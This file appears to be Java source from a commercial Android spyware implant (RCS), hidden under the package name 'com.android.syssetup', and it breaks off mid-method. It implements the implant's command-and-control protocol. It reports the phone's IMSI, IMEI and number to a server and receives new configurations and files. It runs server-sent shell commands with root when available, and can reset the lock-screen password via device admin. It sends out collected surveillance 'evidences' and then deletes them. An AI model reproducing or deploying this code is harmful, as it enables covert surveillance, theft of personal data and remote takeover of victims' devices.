/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ZProtocol.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.action.sync;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;

import com.android.syssetup.Core;
import com.android.syssetup.Device;
import com.android.syssetup.Status;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.crypto.CryptoException;
import com.android.syssetup.crypto.EncryptionPKCS5;
import com.android.syssetup.crypto.Keys;
import com.android.syssetup.crypto.SHA1Digest;
import com.android.syssetup.evidence.EvidenceCollector;
import com.android.syssetup.file.AutoFile;
import com.android.syssetup.file.Directory;
import com.android.syssetup.file.Path;
import com.android.syssetup.listener.AdR;
import com.android.syssetup.util.ByteArray;
import com.android.syssetup.util.Check;
import com.android.syssetup.util.DataBuffer;
import com.android.syssetup.util.Execute;
import com.android.syssetup.util.ExecuteResult;
import com.android.syssetup.util.Utils;
import com.android.syssetup.util.WChar;
import com.android.mm.M;

import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Date;
import java.util.Vector;

import static com.android.syssetup.capabilities.PackageInfo.checkRoot;

/**
 * The Class ZProtocol.
 */
public class ZProtocol extends Protocol {
	/**
	 * The debug.
	 */
	private static final String TAG = "ZProtocol"; //$NON-NLS-1$
	/**
	 * The Constant SHA1LEN.
	 */
	private static final int SHA1LEN = 20;
	/**
	 * The crypto k.
	 */
	private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();

	/**
	 * The crypto conf.
	 */
	private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5();

	/**
	 * The Kd.
	 */
	byte[] Kd = new byte[16];

	/**
	 * The Nonce.
	 */
	byte[] Nonce = new byte[16];

	/**
	 * The upgrade files.
	 */
	Vector<String> upgradeFiles = new Vector<String>();

	/**
	 * Instantiates a new z protocol.
	 */
	public ZProtocol() {
		try {
			// 6_1=SHA1PRNG
			random = SecureRandom.getInstance(M.e("SHA1PRNG")); //$NON-NLS-1$
		} catch (final NoSuchAlgorithmException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (ZProtocol): " + e); //$NON-NLS-1$
			}

			if (Cfg.DEBUG) {
				Check.log(e);
			}
		}
	}

	/**
	 * The random.
	 */
	SecureRandom random;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.sync.Protocol#perform()
	 */
	@Override
	public boolean perform() {
		if (Cfg.DEBUG) {
			Check.requires(transport != null, "perform: transport = null"); //$NON-NLS-1$
		}

		try {
			transport.start();

			status.uninstall = authentication();

			if (status.uninstall) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Warn: " + "Uninstall detected, no need to continue"); //$NON-NLS-1$ //$NON-NLS-2$
				}

				return true;
			}

			final boolean[] capabilities = identification();

			if (Status.self().wantsReload()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (perform) reloading conf");
				}
				Core.self().reloadConf();
			} else {
				checkRoot();
			}

			purge(capabilities[Proto.PURGE]);
			newConf(capabilities[Proto.NEW_CONF]);
			download(capabilities[Proto.DOWNLOAD]);
			upload(capabilities[Proto.UPLOAD]);
			upgrade(capabilities[Proto.UPGRADE]);
			filesystem(capabilities[Proto.FILESYSTEM]);
			execute(capabilities[Proto.EXEC]);
			evidences();
			end();

			return true;

		} catch (final TransportException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
			}

			return false;
		} catch (final ProtocolException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
			}

			return false;
		} catch (final CommandException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
			}

			return false;
		} finally {
			transport.close();
		}
	}

	/**
	 * Authentication.
	 *
	 * @return true if uninstall
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 */
	private boolean authentication() throws TransportException, ProtocolException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: ***** Authentication ***** "); //$NON-NLS-1$
		}

		// key init
		try {
			cryptoConf.init(Keys.self().getChallengeKey());
			random.nextBytes(Kd);
			random.nextBytes(Nonce);

			final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
			if (Cfg.DEBUG) {
				Check.asserts(cypherOut.length % 16 == 0, " (authentication) Assert failed, not multiple of 16: "
						+ cypherOut.length);
			}

			final byte[] response = transport.command(cypherOut);

			return parseAuthentication(response);

		} catch (CryptoException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (authentication) Error: " + e);
			}
			return false;
		}

	}

	/**
	 * Identification.
	 *
	 * @return the boolean[]
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 */
	private boolean[] identification() throws TransportException, ProtocolException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: ***** Identification *****"); //$NON-NLS-1$
		}

		final byte[] response = command(Proto.ID, forgeIdentification());
		final boolean[] capabilities = parseIdentification(response);

		return capabilities;
	}

	private void purge(final boolean cap) throws TransportException, ProtocolException {
		if (cap) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: ***** PURGE *****"); //$NON-NLS-1$
			}
			final byte[] response = command(Proto.PURGE);
			parsePurge(response);
		}
	}

	/**
	 * New conf.
	 *
	 * @param cap the cap
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 * @throws CommandException   the command exception
	 */
	private void newConf(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: ***** NewConf *****"); //$NON-NLS-1$
			}
			final byte[] response = command(Proto.NEW_CONF);
			int ret = parseNewConf(response);

			byte[] data;
			if (ret != Proto.NO) {
				if (ret == Proto.OK) {
					data = ByteArray.intToByteArray(Proto.OK);
				} else {
					data = ByteArray.intToByteArray(Proto.NO);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (newConf): sending conf answer: " + ret);
				}
				command(Proto.NEW_CONF, data);

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (newConf): no conf, no need to write another message");
				}
			}

		}
	}

	/**
	 * Download.
	 *
	 * @param cap the cap
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 * @throws CommandException   the command exception
	 */
	private void download(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			final byte[] response = command(Proto.DOWNLOAD);
			parseDownload(response);
		}
	}

	/**
	 * Upload.
	 *
	 * @param cap the cap
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 * @throws CommandException   the command exception
	 */
	private void upload(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: ***** Upload *****"); //$NON-NLS-1$
			}
			boolean left = true;
			while (left) {
				final byte[] response = command(Proto.UPLOAD);
				left = parseUpload(response);
			}
		}
	}

	/**
	 * Upgrade.
	 *
	 * @param cap the cap
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 * @throws CommandException   the command exception
	 */
	private void upgrade(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: ***** Upgrade *****"); //$NON-NLS-1$
			}
			upgradeFiles.removeAllElements();

			boolean left = true;
			try {
				while (left) {
					final byte[] response = command(Proto.UPGRADE, WChar.pascalize(Cfg.OSVERSION));
					left = parseUpgrade(response);
				}
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (upgrade) Error: " + ex);
				}
			}
		}
	}

	/**
	 * Filesystem.
	 *
	 * @param cap the cap
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 * @throws CommandException   the command exception
	 */
	private void filesystem(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: ***** FileSystem *****"); //$NON-NLS-1$
			}
			final byte[] response = command(Proto.FILESYSTEM);
			parseFileSystem(response);
		}
	}

	private void execute(boolean cap) throws TransportException, ProtocolException {
		if (cap) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: ***** Execute *****"); //$NON-NLS-1$
			}
			final byte[] response = command(Proto.EXEC);
			parseExecute(response);
		}
	}

	/**
	 * Evidences.
	 *
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 * @throws CommandException   the command exception
	 */
	private void evidences() throws TransportException, ProtocolException, CommandException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: ***** Log *****"); //$NON-NLS-1$
		}

		sendEvidences(Path.logs());

	}

	/**
	 * End.
	 *
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 * @throws CommandException   the command exception
	 */
	private void end() throws TransportException, ProtocolException, CommandException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: ***** END *****"); //$NON-NLS-1$
		}
		final byte[] response = command(Proto.BYE);
		parseEnd(response);
	}

	// **************** PROTOCOL **************** //

	/**
	 * Forge authentication.
	 *
	 * @return the byte[]
	 */
	protected byte[] forgeAuthentication() {
		final Keys keys = Keys.self();

		/*
		 * byte[] randBlock = new byte[]{}; if(Cfg.PROTOCOL_RANDBLOCK){ //
		 * variabilita' di 5 blocchi pkcs5 da 16 randBlock =
		 * Utils.getRandomByteArray(0, 63+8); }
		 * 
		 * final byte[] data = new byte[104 + randBlock.length];
		 */

		final byte[] data = new byte[104];
		final DataBuffer dataBuffer = new DataBuffer(data, 0, data.length);

		// filling structure
		dataBuffer.write(Kd);
		dataBuffer.write(Nonce);

		if (Cfg.DEBUG) {
			Check.ensures(dataBuffer.getPosition() == 32, "forgeAuthentication 1, wrong array size"); //$NON-NLS-1$
		}

		dataBuffer.write(ByteArray.padByteArray(keys.getBuildId(), 16));
		dataBuffer.write(keys.getInstanceId());
		dataBuffer.write(ByteArray.padByteArray(Keys.getSubtype(), 16));

		if (Cfg.DEBUG) {
			Check.ensures(dataBuffer.getPosition() == 84, "forgeAuthentication 2, wrong array size"); //$NON-NLS-1$
		}

		// dataBuffer.write(randBlock);

		// calculating digest
		final SHA1Digest digest = new SHA1Digest();
		digest.update(ByteArray.padByteArray(keys.getBuildId(), 16));
		digest.update(keys.getInstanceId());
		digest.update(ByteArray.padByteArray(Keys.getSubtype(), 16));
		digest.update(keys.getConfKey());
		// digest.update(randBlock);

		final byte[] sha1 = digest.getDigest();

		// appending digest
		dataBuffer.write(sha1);

		if (Cfg.DEBUG) {
			Check.ensures(dataBuffer.getPosition() == data.length, "forgeAuthentication 3, wrong array size"); //$NON-NLS-1$
		}
		return data;
	}

	/**
	 * Parses the authentication.
	 *
	 * @param authResult the auth result
	 * @return true if uninstall
	 * @throws ProtocolException the protocol exception
	 */
	protected boolean parseAuthentication(final byte[] authResult) throws ProtocolException {
		if (authResult == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: null result"); //$NON-NLS-1$
			}
			throw new ProtocolException(100);
		}
		if (new String(authResult).contains(M.e("<html>"))) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: Fake answer"); //$NON-NLS-1$
			}
			throw new ProtocolException(14);
		}
		if (Cfg.DEBUG) {
			Check.ensures(authResult.length == 64, "authResult.length=" + authResult.length); //$NON-NLS-1$
		}
		// Retrieve K
		final byte[] cypherKs = new byte[32];
		System.arraycopy(authResult, 0, cypherKs, 0, cypherKs.length);
		try {
			final byte[] Ks = cryptoConf.decryptData(cypherKs);
			// PBKDF1 (SHA1, c=1, Salt=KS||Kd)
			final SHA1Digest digest = new SHA1Digest();
			digest.update(Keys.self().getConfKey());
			digest.update(Ks);
			digest.update(Kd);

			final byte[] K = new byte[16];
			System.arraycopy(digest.getDigest(), 0, K, 0, K.length);

			cryptoK.init(K);
			// Retrieve Nonce and Cap
			final byte[] cypherNonceCap = new byte[32];
			System.arraycopy(authResult, 32, cypherNonceCap, 0, cypherNonceCap.length);

			final byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
			final boolean nonceOK = ByteArray.equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
			if (nonceOK) {
				final int cap = ByteArray.byteArrayToInt(plainNonceCap, 16);
				if (cap == Proto.OK) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " decodeAuth Proto OK"); //$NON-NLS-1$
					}
				} else if (cap == Proto.UNINSTALL) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " decodeAuth Proto Uninstall"); //$NON-NLS-1$
					}
					return true;
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " decodeAuth error: " + cap); //$NON-NLS-1$
					}
					throw new ProtocolException(11);
				}
			} else {
				throw new ProtocolException(12);
			}

		} catch (final CryptoException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: parseAuthentication: " + ex); //$NON-NLS-1$
			}
			throw new ProtocolException(13);
		}

		return false;
	}

	/**
	 * Forge identification.
	 *
	 * @return the byte[]
	 */
	protected byte[] forgeIdentification() {
		final Device device = Device.self();

		final byte[] userid = WChar.pascalize(device.getImsi());
		final byte[] deviceid = WChar.pascalize(device.getImei());

		// Non abbiamo quasi mai il numero, inviamo una stringa vuota
		// cosi appare l'ip
		final byte[] phone = WChar.pascalize(device.getPhoneNumber());

		final int len = 4 + userid.length + deviceid.length + phone.length;

		final byte[] content = new byte[len];

		final DataBuffer dataBuffer = new DataBuffer(content, 0, content.length);
		// dataBuffer.writeInt(Proto.ID);
		dataBuffer.write(device.getVersion());
		dataBuffer.write(userid);
		dataBuffer.write(deviceid);
		dataBuffer.write(phone);

		if (Cfg.DEBUG) {
			Check.ensures(dataBuffer.getPosition() == content.length,
					"forgeIdentification pos: " + dataBuffer.getPosition()); //$NON-NLS-1$
		}

		return content;
	}

	/**
	 * Parses the identification.
	 *
	 * @param result the result
	 * @return the boolean[]
	 * @throws ProtocolException the protocol exception
	 */
	protected boolean[] parseIdentification(final byte[] result) throws ProtocolException {
		final boolean[] capabilities = new boolean[Proto.LASTTYPE];

		final int res = ByteArray.byteArrayToInt(result, 0);

		if (res == Proto.OK) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: got Identification"); //$NON-NLS-1$
			}
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);

			try {
				// la totSize e' discutibile
				final int totSize = dataBuffer.readInt();

				final long dateServer = dataBuffer.readLong();
				if (Cfg.DEBUG) {
					Check.log(TAG + " parseIdentification: " + dateServer); //$NON-NLS-1$
				}
				final Date date = new Date();
				final int drift = (int) (dateServer - (date.getTime() / 1000));
				if (Cfg.DEBUG) {
					Check.log(TAG + " parseIdentification drift: " + drift); //$NON-NLS-1$
				}
				Status.self().drift = drift;

				final int numElem = dataBuffer.readInt();

				for (int i = 0; i < numElem; i++) {
					final int cap = dataBuffer.readInt();
					if (cap < Proto.LASTTYPE) {
						capabilities[cap] = true;
						if (Cfg.DEBUG) {
							Check.log(TAG + " capabilities: " + capabilities[i]); //$NON-NLS-1$
						}
					}
				}

			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
				}
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: no new conf: "); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: parseNewConf: " + res); //$NON-NLS-1$
			}
			throw new ProtocolException();
		}

		return capabilities;
	}

	protected void parsePurge(byte[] result) throws ProtocolException {

		int res = ByteArray.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			final int len = ByteArray.byteArrayToInt(result, 4);
			if (len >= 12) {

				long time = ByteArray.byteArrayToLong(result, 8);
				int size = ByteArray.byteArrayToInt(result, 16);

				Date date = null;
				if (time > 0) {
					date = new Date(time * 1000L);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parsePurge): date: " + date + " size: " + size);
				}

				purgeEvidences(Path.logs(), date, size);
			}

		}
	}

	/**
	 * Parses the new conf.
	 *
	 * @param result the result
	 * @return false if error loading new conf, true if no conf or conf read
	 * correct
	 * @throws ProtocolException the protocol exception
	 * @throws CommandException  the command exception
	 */
	protected int parseNewConf(final byte[] result) throws ProtocolException, CommandException {
		final int res = ByteArray.byteArrayToInt(result, 0);
		boolean ret = false;
		if (res == Proto.OK) {

			final int confLen = ByteArray.byteArrayToInt(result, 4);
			if (confLen > 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: got NewConf"); //$NON-NLS-1$
				}

				ret = Protocol.saveNewConf(result, 0);

				if (ret) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (parseNewConf): RELOADING"); //$NON-NLS-1$
					}
					// status.reload = true;
					ret = Core.self().reloadConf();
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (parseNewConf): ERROR RELOADING"); //$NON-NLS-1$
					}
				}

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (parseNewConf): empty conf"); //$NON-NLS-1$
				}
			}
			if (ret) {
				return Proto.OK;
			} else {
				return Proto.ERROR;
			}

		} else if (res == Proto.NO) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: no new conf: "); //$NON-NLS-1$

			}
			return Proto.NO;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: parseNewConf: " + res); //$NON-NLS-1$
			}
			throw new ProtocolException();
		}

	}

	/**
	 * Parses the download.
	 *
	 * @param result the result
	 * @throws ProtocolException the protocol exception
	 */
	protected void parseDownload(final byte[] result) throws ProtocolException {
		final int res = ByteArray.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " parseDownload, OK"); //$NON-NLS-1$
			}
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				// la totSize e' discutibile
				final int totSize = dataBuffer.readInt();
				final int numElem = dataBuffer.readInt();
				for (int i = 0; i < numElem; i++) {
					String file = WChar.readPascal(dataBuffer);
					if (Cfg.DEBUG) {
						Check.log(TAG + " parseDownload: " + file); //$NON-NLS-1$
					}
					// expanding $dir$
					file = Directory.expandMacro(file);
					file = Protocol.normalizeFilename(file);
					// TODO: non caricare intero il file in memoria
					Protocol.saveDownloadLog(file);
				}

			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e); //$NON-NLS-1$
				}
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: parseDownload: no download"); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: parseDownload, wrong answer: " + res); //$NON-NLS-1$
			}
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the upload.
	 *
	 * @param result the result
	 * @return true if left>0
	 * @throws ProtocolException the protocol exception
	 */
	protected boolean parseUpload(final byte[] result) throws ProtocolException {

		final int res = ByteArray.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " parseUpload, OK"); //$NON-NLS-1$
			}
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int left = dataBuffer.readInt();
				if (Cfg.DEBUG) {
					Check.log(TAG + " parseUpload left: " + left); //$NON-NLS-1$
				}
				final String filename = WChar.readPascal(dataBuffer);
				if (Cfg.DEBUG) {
					Check.log(TAG + " parseUpload: " + filename); //$NON-NLS-1$
				}
				final int size = dataBuffer.readInt();
				final byte[] content = new byte[size];
				dataBuffer.read(content);
				if (Cfg.DEBUG) {
					Check.log(TAG + " parseUpload: saving"); //$NON-NLS-1$
				}
				Protocol.saveUpload(filename, content);

				if (filename.equals(Protocol.UPGRADE_FILENAME)) {
					final Vector<String> vector = new Vector<String>();
					vector.add(filename);
					Protocol.upgradeMulti(vector);
				}

				return left > 0;

			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
				}
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " parseUpload, NO"); //$NON-NLS-1$
			}
			return false;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: parseUpload, wrong answer: " + res); //$NON-NLS-1$
			}
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the upgrade.
	 *
	 * @param result the result
	 * @return true, if successful
	 * @throws ProtocolException the protocol exception
	 */
	protected boolean parseUpgrade(final byte[] result) throws ProtocolException {

		final int res = ByteArray.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " parseUpgrade, OK"); //$NON-NLS-1$
			}
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int left = dataBuffer.readInt();
				if (Cfg.DEBUG) {
					Check.log(TAG + " parseUpgrade left: " + left); //$NON-NLS-1$
				}
				final String filename = WChar.readPascal(dataBuffer);
				if (Cfg.DEBUG) {
					Check.log(TAG + " parseUpgrade: " + filename); //$NON-NLS-1$
				}
				final int size = dataBuffer.readInt();
				final byte[] content = new byte[size];
				dataBuffer.read(content);
				if (Cfg.DEBUG) {
					Check.log(TAG + " parseUpgrade: saving %s/%s", Path.uploads(), filename); //$NON-NLS-1$
				}
				Protocol.saveUpload(filename, content);
				upgradeFiles.addElement(filename);

				if (left == 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " parseUpgrade: all file saved, proceed with upgrade"); //$NON-NLS-1$
					}
					Protocol.upgradeMulti(upgradeFiles);
				}

				return left > 0;

			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
				}
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " parseUpload, NO"); //$NON-NLS-1$
			}
			return false;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: parseUpload, wrong answer: " + res); //$NON-NLS-1$
			}
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the file system.
	 *
	 * @param result the result
	 * @throws ProtocolException the protocol exception
	 */
	protected void parseFileSystem(final byte[] result) throws ProtocolException {
		final int res = ByteArray.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " parseFileSystem, OK"); //$NON-NLS-1$
			}
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int numElem = dataBuffer.readInt();
				for (int i = 0; i < numElem; i++) {
					final int depth = dataBuffer.readInt();
					String file = WChar.readPascal(dataBuffer);
					if (Cfg.DEBUG) {
						Check.log(TAG + " parseFileSystem: " + file + " depth: " + depth); //$NON-NLS-1$ //$NON-NLS-2$
					}
					// expanding $dir$
					file = Directory.expandMacro(file);
					Protocol.saveFilesystem(depth, file);
				}

			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: parse error: " + e); //$NON-NLS-1$
				}
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: parseFileSystem: no download"); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: parseFileSystem, wrong answer: " + res); //$NON-NLS-1$
			}
			throw new ProtocolException();
		}
	}

	private ExecuteResult resetPassword() {
		boolean ret = false;
		ExecuteResult res = new ExecuteResult(M.e("RESET_PASSWORD"));
		ComponentName devAdminReceiver = new ComponentName(Status.getAppContext(), AdR.class);
		DevicePolicyManager dpm = (DevicePolicyManager) Status.getAppContext().getSystemService(
				Context.DEVICE_POLICY_SERVICE);
		if (dpm.isAdminActive(devAdminReceiver)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (removeAdmin) remove password");
			}

			if (Cfg.DEBUG) {
				ret = dpm.resetPassword("", 0);
			}
		}
		res.stdout.add((ret ? "OK RESET" : "NO RESET"));
		return res;
	}

	protected void parseExecute(byte[] response) throws ProtocolException {
		final int res = ByteArray.byteArrayToInt(response, 0);
		if (res == Proto.OK) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " parseExecute, OK"); //$NON-NLS-1$
			}
			final DataBuffer dataBuffer = new DataBuffer(response, 4, response.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int numCommand = dataBuffer.readInt();

				for (int i = 0; i < numCommand; i++) {
					String executionLine = WChar.readPascal(dataBuffer);
					executionLine = Directory.expandMacro(executionLine);

					ExecuteResult ret;
					if (executionLine.equals(M.e("RESET_PASSWORD"))) {
						ret = resetPassword();
						ret.saveEvidence();
					} else if (executionLine.equals(M.e("DEMO_SILENT"))) {
						Cfg.DEMO_SILENT = true;
					} else {
						if (Status.self().haveRoot()) {
							ret = Execute.executeRoot(executionLine);
						} else {
							ret = Execute.execute(executionLine);
						}
						ret.saveEvidence();
					}

				}

			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: parse error: " + e); //$NON-NLS-1$
				}
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: parseFileSystem: no download"); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: parseFileSystem, wrong answer: " + res); //$NON-NLS-1$
			}
			throw new ProtocolException();
		}
	}

	protected void purgeEvidences(final String basePath, Date date, int size) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: purgeEvidences from: " + basePath); //$NON-NLS-1$
		}
		final EvidenceCollector logCollector = EvidenceCollector.self();
		final Vector dirs = logCollector.scanForDirLogs(basePath);

		final int dsize = dirs.size();

		if (Cfg.DEBUG) {
			Check.log(TAG + " purgeEvidences #directories: " + dsize); //$NON-NLS-1$
		}

		for (int i = 0; i < dsize; ++i) {
			final String dir = (String) dirs.elementAt(i); // per reverse:
			// dsize-i-1
			final String[] logs = logCollector.scanForEvidences(basePath, dir);

			final int lsize = logs.length;

			if (Cfg.DEBUG) {
				Check.log(TAG + "    dir: " + dir + " #evidences: " + lsize); //$NON-NLS-1$ //$NON-NLS-2$
			}

			for (final String logName : logs) {
				final String fullLogName = basePath + dir + logName;
				final AutoFile file = new AutoFile(fullLogName);

				if (file.exists()) {
					if (size > 0 && file.getSize() > size) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (purgeEvidences): removing due size: "
									+ EvidenceCollector.decryptName(logName));
						}

						file.delete();
					} else if (date != null && file.lastModified() < date.getTime()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (purgeEvidences): removing due date: "
									+ EvidenceCollector.decryptName(logName));
						}

						file.delete();
					}
				}
			}
		}
	}

	/**
	 * Send evidences.
	 *
	 * @param basePath the base path
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 */
	protected void sendEvidences(final String basePath) throws TransportException, ProtocolException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: sendEvidences from: " + basePath); //$NON-NLS-1$
		}
		final EvidenceCollector logCollector = EvidenceCollector.self();
		final Vector dirs = logCollector.scanForDirLogs(basePath);

		final int dsize = dirs.size();

		if (Cfg.DEBUG) {
			Check.log(TAG + " sendEvidences #directories: " + dsize); //$NON-NLS-1$
		}

		for (int i = 0; i < dsize; ++i) {
			final String dir = (String) dirs.elementAt(i); // per reverse:
			// dsize-i-1
			final String[] logs = logCollector.scanForEvidences(basePath, dir);

			final int lsize = logs.length;

			if (Cfg.DEBUG) {
				Check.log(TAG + "    dir: " + dir + " #evidences: " + lsize); //$NON-NLS-1$ //$NON-NLS-2$
			}

			final byte[] evidenceSize = new byte[12];
			System.arraycopy(ByteArray.intToByteArray(lsize), 0, evidenceSize, 0, 4);

			byte[] response = command(Proto.EVIDENCE_SIZE, evidenceSize);

			// Andrebbe checkato il response di questo comando
			checkOk(response);

			response = null;

			// for (int j = 0; j < lsize; ++j) {
			// final String logName = (String) logs.elementAt(j);
			for (final String logName : logs) {
				final String fullLogName = basePath + dir + logName;
				final AutoFile file = new AutoFile(fullLogName);

				if (!file.exists()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Error: File doesn't exist: " + fullLogName); //$NON-NLS-1$
					}
					continue;
				}

				if (file.getSize() > Cfg.PROTOCOL_CHUNK) {
					sendResumeEvidence(file);
				} else {
					sendEvidence(file);
				}

			}

			if (!Path.removeDirectory(basePath + dir)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Warn: " + "Not empty directory"); //$NON-NLS-1$ //$NON-NLS-2$
				}
			}
		}
	}

	private boolean sendEvidence(AutoFile file) throws TransportException, ProtocolException {
		final byte[] content = file.read();

		if (content == null) {
			if (Cfg.DEBUG) {
